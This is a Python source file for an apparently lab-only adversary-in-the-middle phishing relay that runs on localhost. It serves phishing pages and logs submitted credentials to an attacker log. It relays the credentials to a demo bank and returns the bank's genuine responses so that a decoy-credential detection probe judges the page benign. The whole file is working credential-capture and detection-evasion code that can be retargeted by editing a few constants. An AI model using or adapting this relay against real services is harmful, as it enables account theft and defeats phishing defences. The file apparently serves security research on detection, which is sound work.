"""Stage 11 upgrade: realistic lab AiTM (adversary-in-the-middle) relay - 127.0.0.1:8005.

LAB ONLY. The phishing page is served by THIS relay's own origin and posts SAME-ORIGIN
back to the relay (GET / -> the page, POST /login -> here). The relay captures the (fake)
credentials AND forwards them server-side to our own Formosa Demo Bank (127.0.0.1:8000),
then returns the bank's GENUINE response - including a real "wrong password" (401) when the
credentials are wrong. So a decoy-credential probe that submits bad creds sees a real auth
error and is fooled into calling the page benign (hypothesis 6). Everything is 127.0.0.1 and
fake (demo_user_01 / Lab-Pass-4821).
"""

import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

HOST, PORT = "127.0.0.1", 8005
BANK = "http://127.0.0.1:8000/login"                        # our own Formosa Demo Bank
PAGE = Path(__file__).with_name("attacks") / "aitm_leak.html"
NOBRAND_PAGE = Path(__file__).with_name("attacks") / "aitm_nobrand.html"
LOG_PATH = Path(__file__).resolve().parent.parent / "logs" / "attacker.log"


class RelayHandler(BaseHTTPRequestHandler):
    def do_GET(self) -> None:
        page = NOBRAND_PAGE if self.path.startswith("/nobrand") else PAGE
        self._reply(200, page.read_bytes(), "text/html; charset=utf-8")

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", "replace")
        # 1) capture - the leak the attacker now holds
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"AiTM relay captured: {body}\n")
        # 2) forward to the real bank; pass its genuine response (incl. 401) straight back
        req = urllib.request.Request(BANK, data=body.encode(), method="POST",
                                     headers={"Content-Type": "application/x-www-form-urlencoded"})
        try:
            r = urllib.request.urlopen(req, timeout=2)
            status, out = r.status, r.read()
        except urllib.error.HTTPError as e:                 # e.g. 401 wrong password
            status, out = e.code, e.read()
        except Exception:
            status, out = 502, b"relay error"
        self._reply(status, out, "text/html; charset=utf-8")

    def _reply(self, status: int, body: bytes, ctype: str) -> None:
        self.send_response(status)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a) -> None:
        pass


def main() -> None:
    print(f"AiTM relay (lab) on http://{HOST}:{PORT}  (serves the page, forwards to {BANK})")
    HTTPServer((HOST, PORT), RelayHandler).serve_forever()


if __name__ == "__main__":
    main()
